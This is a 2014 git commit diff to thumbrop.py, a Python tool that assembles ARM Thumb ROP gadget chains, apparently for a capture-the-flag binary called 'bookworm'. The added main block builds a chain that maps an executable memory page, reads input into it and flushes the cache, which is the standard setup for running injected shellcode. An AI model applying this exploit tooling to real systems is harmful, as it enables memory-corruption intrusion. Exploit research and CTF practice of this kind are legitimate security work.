e4a4967a664f96faf3d0ae8fadebcc4fd36ba695
Jonas Rudloff <nlz708@alumni.ku.dk>
2014-05-28 10:50:11 +0200

    Testing + gadget score fix

--- thumbrop.py
+++ thumbrop.py
@@ -33,20 +33,23 @@ class ROP:
                     continue
                 self.swi_0 = (addr, inst2)
 
-    def pop_gadget_score(self, gadget, regs):
-        return len(set(gadget[1]) & regs)
-        matching = len(set(gadget[1]) & regs)
-        unneeded = len(set(gadget[1]) - regs)
-        return matching*16-unneeded
+
+    def find_best_gadget(self, regs):
+        def pop_gadget_score(gadget, regs):
+            return len(set(gadget[1]) & regs)
+        #must contain atleast one register we want.
+        gadgets = ((a,g) for (a,g) in self.pop_pc if len(set(g[1]) & regs) > 0)
+        return max(gadgets, key = lambda (a, g): pop_gadget_score(g, regs))
 
     def set_regs(self, **regs_dict):
         ropchain = []
         regs = set(map(lambda x: x.upper(), regs_dict.keys()))
-        while regs:
-            addr, inst = max(self.pop_pc,
-                    key=lambda (addr, inst): self.pop_gadget_score(inst, regs))
+        old_regs = None
+        while regs and regs != old_regs:
+            addr, inst = self.find_best_gadget(regs)
             ropchain.append(addr | 1)
             ropchain += [regs_dict.get(reg, 0x41414141) for reg in inst[1][:-1]]
+            old_regs = set(regs)
             regs -= set(inst[1])
 
         if regs:
@@ -78,3 +81,10 @@ class ROP:
         ropchain = "".join(map(p32, self.ropchain))
         self.ropchain = []
         return ropchain
+
+if __name__ == "__main__":
+    rop = ROP("bookworm")
+    rop.syscall(R0=0xaa0000, R1=0x1000, R2=7, R3=0x32, R4=0xffffffff, R5=0, R7=192)
+    rop.syscall(R0=0, R1=0xaa0000, R2=0x142, R7=3)
+    rop.syscall(R7=0xf0002)
+    print map(hex, rop.ropchain)
